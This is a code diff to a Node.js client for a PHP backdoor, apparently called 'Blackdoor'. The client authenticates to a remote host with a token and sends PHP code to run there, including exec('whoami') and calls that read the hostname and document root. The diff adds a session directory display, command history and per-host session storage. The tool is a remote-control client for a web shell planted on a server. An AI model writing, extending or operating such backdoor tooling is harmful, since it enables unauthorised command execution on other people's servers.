@@ -31,7 +31,8 @@ class Shell{
 
 	welcomeScreen(){
 		term.white('\nWelcome on ').bold.red('Blackdoor').white(' client!\n');
-		term.white('You are connecting from : ').blue(this.entrypoint+'\n\n');
+		term.white('You are connecting from : ').blue(this.entrypoint+'\n');
+		term.white('Session data will store here : ').blue(this.sessionDir+'\n\n');
 	}
 
 	async auth(host, token){
@@ -40,14 +41,16 @@ class Shell{
 		this.token = token;
 
 		let data = await this.php(`return array(
-				'sucess' => true, 
-				'pwd' => $_SERVER['DOCUMENT_ROOT'],
-				'whoami' => exec('whoami'),
-				'hostname' => gethostname()
+			'sucess' => true, 
+			'pwd' => $_SERVER['DOCUMENT_ROOT'],
+			'whoami' => exec('whoami'),
+			'hostname' => gethostname()
 		);`);
 
         this.user = data.whoami;
         this.hostname = data.hostname;
+        this.history = [];
+		this.sessionDir = process.env[(process.platform === 'win32') ? 'USERPROFILE' : 'HOME']+'/.blackdoor/'+this.hostname;
 
 		if(data.sucess !== true){
 			term.red('Connection failed.');
